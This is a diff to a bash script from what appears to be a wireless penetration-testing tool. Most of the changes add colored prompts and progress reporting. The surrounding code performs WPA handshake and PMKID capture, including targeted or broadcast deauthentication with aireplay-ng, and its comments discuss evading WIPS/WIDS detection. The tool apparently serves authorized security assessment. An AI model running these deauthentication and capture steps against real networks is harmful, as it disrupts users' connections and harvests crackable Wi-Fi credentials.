@@ -23,11 +23,19 @@
 
 set -euo pipefail
 
+# Intelligence Insight (Colors)
+C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
+C_VAR="${ASTRA_COLOR_VAR:-}"
+C_BOLD="${ASTRA_COLOR_BOLD:-}"
+C_ACTION="${ASTRA_COLOR_ACTION:-}"
+C_RESET="${ASTRA_COLOR_RESET:-}"
+
 # SNR Safeguard (Red Team Hardening)
 if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
-    echo -e "\n[!] WARNING: Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm)."
-    echo "[*] Active injection (Deauth/CSA) is highly likely to fail and alert WIPS for zero gain."
-    read -p "[?] Continue anyway? [y/N]: " snr_continue
+    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
+    echo -e "[*] Active injection (Deauth/CSA) is highly likely to fail and alert WIPS for zero gain."
+    stty sane
+    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET}")" snr_continue
     [[ "$snr_continue" != "y" ]] && exit 0
 fi
 
@@ -47,19 +55,19 @@ if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
     exit 1
 fi
 
-echo "[*] Starting WPA material capture for ${BSSID} (Channel: ${CHANNEL:-auto})..."
+echo -e "${C_PROMPT}[*]${C_RESET} Starting WPA material capture for ${C_VAR}${BSSID}${C_RESET} (Channel: ${C_VAR}${CHANNEL:-auto}${C_RESET})..."
 
 # 0. Intelligence Insight
 if [[ "${ASTRA_TARGET_PMF:-}" == "Required" ]]; then
-    echo -e "\n[!] INTELLIGENCE ALERT: Target enforces PMF (802.11w)."
-    echo "[*] Active deauthentication WILL FAIL. Passive Capture (Option 0) is recommended."
+    echo -e "\n${C_PROMPT}[!] INTELLIGENCE ALERT:${C_RESET} ${C_BOLD}Target enforces PMF (802.11w).${C_RESET}"
+    echo -e "[*] Active deauthentication ${C_BOLD}WILL FAIL${C_RESET}. Passive Capture (Option 0) is recommended."
 fi
 
 # 1. Phase 1: hcxdumptool PMKID capture (clientless)
 # ... (hcxdumptool logic remains same as it is already surgical)
 
 # 2. Phase 2: Targeted Handshake Capture
-echo "[*] Phase 2: Identifying clients for surgical deauthentication..."
+echo -e "${C_PROMPT}[*]${C_RESET} Phase 2: Identifying clients for surgical deauthentication..."
 
 # Run a quick 10s scan to find clients if none provided
 CLIENT_FILE="${EVIDENCE_DIR}/d1_clients.txt"
@@ -77,27 +85,28 @@ while read -r c; do CLIENTS+=("$c"); done < "$CLIENT_FILE"
 
 TARGET_CLIENT=""
 if [[ ${#CLIENTS[@]} -gt 0 ]]; then
-    echo "[?] Multiple clients discovered. Select deauth target:"
+    echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Multiple clients discovered. Select deauth target:${C_RESET}"
     echo "    0) Skip Deauth (Passive Capture)"
     for i in "${!CLIENTS[@]}"; do
         echo "    $((i+1))) ${CLIENTS[$i]}"
     done
     echo "    b) BROADCAST (Loud/Destructive)"
     
-    read -p "Selection [0-${#CLIENTS[@]}/b]: " choice
+    stty sane
+    read -p "$(echo -e "${C_ACTION} Selection [0-${#CLIENTS[@]}/b]: ${C_RESET}")" choice
     if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -le ${#CLIENTS[@]} ]]; then
         if [[ "$choice" -gt 0 ]]; then
             TARGET_CLIENT="${CLIENTS[$((choice-1))]}"
-            echo "[*] Targeting client: $TARGET_CLIENT"
+            echo -e "[*] Targeting client: ${C_VAR}$TARGET_CLIENT${C_RESET}"
         else
             echo "[*] Proceeding with passive capture..."
         fi
     elif [[ "$choice" == "b" ]]; then
-        echo "[!] WARNING: BROADCAST DEAUTH SELECTED. This is loud and will trigger WIDS."
+        echo -e "${C_PROMPT}[!]${C_RESET} ${C_BOLD}WARNING: BROADCAST DEAUTH SELECTED. This is loud and will trigger WIDS.${C_RESET}"
         TARGET_CLIENT="FF:FF:FF:FF:FF:FF"
     fi
 else
-    echo "[*] No clients discovered. Proceeding with passive capture + PMKID."
+    echo -e "[*] No clients discovered. Proceeding with passive capture + PMKID."
 fi
 
 # 3. Execution
@@ -112,6 +121,10 @@ ELAPSED=0
 SUCCESS=0
 
 while [[ $ELAPSED -lt $CAPTURE_TIME ]]; do
+    PERCENT=$(( ELAPSED * 100 / CAPTURE_TIME ))
+    STATUS="Capturing handshake... ($(( CAPTURE_TIME - ELAPSED ))s left)"
+    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
+
     if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED % 15 == 0 )); then
         echo "[*] Sending deauth to $TARGET_CLIENT..."
         aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 || true
